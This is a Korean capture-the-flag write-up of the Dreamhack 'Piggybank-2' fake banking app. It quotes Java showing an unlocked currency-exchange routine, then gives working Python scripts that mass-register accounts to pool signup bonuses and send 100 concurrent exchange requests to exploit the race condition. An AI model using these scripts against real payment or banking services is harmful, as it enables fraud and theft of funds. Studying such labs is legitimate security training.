# Piggybank-2
## Overview
springboot를 이용하여 jar 형태로 배포된 가상의 은행 웹서비스이다.

여러 기능이 존재하지만, krw 보유 금액을 100만원으로 올려 flag를 구매하는 것이 목표이기 때문에 이와 관련된 기능을 살펴봤다.

`UserRegisterController:doSignUp:`
```java
            Tuples<String, String> createUser = this.userService.createUser(data.getUsername(), data.getPassword(), data.getEmail(), data.getRealName(), data.getRegNumber(), data.getCountryCode(), data.getMemo());
            String newSecureCode = createUser.component1();
            String uuid = createUser.component2();
            String adminUuid = this.cashService.getAdminUuid(UserConstants.ADMIN_USERNAME);
            this.krwcashService.createBank(uuid);
            this.krwcashService.rewardForNewMember(adminUuid, uuid, new BigDecimal(10000));

```
회원 가입 시 최초 지급금 10000 krw가 설정되어 있다.
또한 krw를 송금하는 기능이 존재하기 때문에 새로운 사용자를 100번 만들어 100번 송금하면 flag를 구매할 수 있을 것 같지만 다음과 같은 제한이 걸려있다:
`UserService:checkUserLimitCount:`
```java
    public void checkUserLimitCount() {
        long userCount = this.userRepository.count();
        if (userCount >= 50) {
            throw new UserServiceException("더이상 계정을 생성할 수 없습니다.");
        }
    }

```
때문에 최대 50만원의 초기 지급금을 보유한 상태로 100만원으로 금액을 불려야 한다.

기능이 송금과 krw <-> usd 전환밖에 없었기 때문에 해당 기능을 집중적으로 분석하던 중, 동시 요청에 관한 예외 처리 및 database lock이 걸려있지 않은 부분을 발견하였다:
`CashService:exchangeCash:`
```java
        if (Intrinsics.areEqual(src, CashConstants.CURRENCY_KRW) || Intrinsics.areEqual(dst, CashConstants.CURRENCY_USD)) {
            Krwcash krwcash = this.krwCashService.findKrwcashById(id);
            if (krwcash == null) {
                throw new CashServiceException("KRW 계좌가 존재하지 않습니다!");
            }
            if (amount.compareTo(BigDecimal.ZERO) <= 0) {
                throw new CashServiceException("보내는 액수가 0보다 커야 합니다!");
            }
            BigDecimal comm = amount.multiply(new BigDecimal(0.008d));
            Intrinsics.checkNotNullExpressionValue(comm, "multiply(...)");
            BigDecimal curPriceWithComm = amount.add(comm);
            Intrinsics.checkNotNullExpressionValue(curPriceWithComm, "add(...)");
            if (krwcash.getBalance().compareTo(curPriceWithComm) >= 0) {
                this.krwCashService.transferCommToBank(id, adminUuid, comm);
                Usdcash usdcash = this.usdCashService.findUsdcashById(id);
                if (usdcash == null) {
                    throw new CashServiceException("USD 계좌가 존재하지 않습니다!");
                }
                BigDecimal subtract = krwcash.getBalance().subtract(curPriceWithComm);
                Intrinsics.checkNotNullExpressionValue(subtract, "subtract(...)");
                krwcash.setBalance(subtract);
                BigDecimal balance = usdcash.getBalance();
                BigDecimal divide = amount.divide(new BigDecimal((int) CashConstants.KRW_PRICE), 4, RoundingMode.FLOOR);
                Intrinsics.checkNotNullExpressionValue(divide, "divide(...)");
                BigDecimal add = balance.add(divide);
                Intrinsics.checkNotNullExpressionValue(add, "add(...)");
                usdcash.setBalance(add);
                saveCashExchangeLog(src, dst, new BigDecimal((int) CashConstants.KRW_PRICE), new BigDecimal(1), amount, id);
                return true;
            }
```
각 요청마다 내부 공통적으로 h2 database를 통해 값을 가져오고, 설정하기 때문에 갖고 있는 krw보다 더 많은 usd를 환전할 수 있어 race-condition 취약점이 발생한다.

## Solution
먼저, 초기 지급금을 얻기 위해 다음과 같은 스크립트를 통해서 50만원을 얻어냈다:
```py
#! C:\Python39\python.exe

import requests

url = "http://host3.dreamhack.games:17123"

API = {
    "mypage": "/api/user/mypage/",
    "reset": "/user/reset/",
    "password": "/user/reset/password/",
    "challenge": "/user/reset/challenge",
    "signup": "/user/signup",
    "signin": "/user/signin",
    "signout": "/user/signout",
    "krwCreate": "/cash/krw/bank/create",
    "usdCreate": "/cash/usd/bank/create",
    "exchange": "/cash/exchange",
    "krw_getBalance": "/cash/krw/getBalance",
    "usd_getBalance": "/cash/usd/getBalance",
    "krw_transfer": "/cash/krw/transfer"
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}

if __name__ == "__main__":
    session = requests.session()

    for i in range(49):
        name = f"test{i}"
        data = {
            "username": f"{name}",
            "password": "testtest",
            "email": f"{name}@test.com",
            "realName": f"{name}",
            "regNumber": "980319123456789",
            "memo": f"{name}",
            "countryCode": "82"
        }
        session.post(url+API['signup'], data = data, headers = headers)

        data = {
            "username": f"{name}",
            "password": "testtest"
        }
        session.post(url+API['signin'], data = data, headers = headers)

        data = {
            "accNumber": "e6f19bf1-2ddb-4798-9027-acc147b0f981",
            "amount": "10000"
        }
        session.post(url+API['krw_transfer'], data = data, headers = headers)

        session.get(url+API['signout'], headers=headers)
```

이후 race-condition 취약점을 통해 환전을 반복하며 금액을 100만원까지 불렸다:
```py
#! C:\Python39\python.exe

import aiohttp
import asyncio
import requests
import re
import math

url = "http://host3.dreamhack.games:17123"

API = {
    "mypage": "/api/user/mypage/",
    "reset": "/user/reset/",
    "password": "/user/reset/password/",
    "challenge": "/user/reset/challenge",
    "signup": "/user/signup",
    "signin": "/user/signin",
    "krwCreate": "/cash/krw/bank/create",
    "usdCreate": "/cash/usd/bank/create",
    "exchange": "/cash/exchange",
    "krw_getBalance": "/cash/krw/getBalance",
    "usd_getBalance": "/cash/usd/getBalance"
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Cookie': 'JSESSIONID=408697BCE11105E8BB4E9CAE18DB8A08'
}

class MyClass:
    def __init__(self) -> None:
        self._session = aiohttp.ClientSession()

    async def exchange(self, src, dst, amount) -> None:
        data = {
            "srcCurrency": src,
            "dstCurrency": dst,
            "amount": amount
        }
        async with self._session.post(url+API['exchange'], data = data, headers = headers) as res:
            text = await res.text()

    async def get_krw_balance(self) -> float:
        async with self._session.get(url+API['krw_getBalance'], headers = headers) as res:
            text = await res.text()
            m = re.search(r'Balance:</h3><h3>(\d*.\d*)</h3>', text)
            balance = m.groups()[0]

            return float(balance)

    async def get_usd_balance(self) -> float:
        async with self._session.get(url+API['usd_getBalance'], headers = headers) as res:
            text = await res.text()
            m = re.search(r'Balance:</h3><h3>(\d*.\d*)</h3>', text)
            balance = m.groups()[0]

            return math.floor(float(balance))

    async def close(self) -> None:
        await self._session.close()

async def main():
    myClass = MyClass()

    while True:
        tasks = [myClass.exchange("KRW", "USD", "100") for _ in range(100)]
        await asyncio.gather(*tasks)
        usd_balance = await myClass.get_usd_balance()
        await myClass.exchange("USD", "KRW", str(usd_balance))
        krw_balance = await myClass.get_krw_balance()
        print(krw_balance)
        if krw_balance >= 1000000.0:
            break
    await myClass.close()

if __name__ == "__main__":
    asyncio.run(main())
```

100만원까지 차근차근 금액을 불린 모습이다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/1d043655c9bd420d48d594f4bc06b88036888622edd5be595da31f84cc14bfd7.png)

그 후 상점에서 플래그를 구입하였다:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/f01de891002d825f8d51d7804ceb9a34844e2bf0d2e86bab325456e7560952bc.png)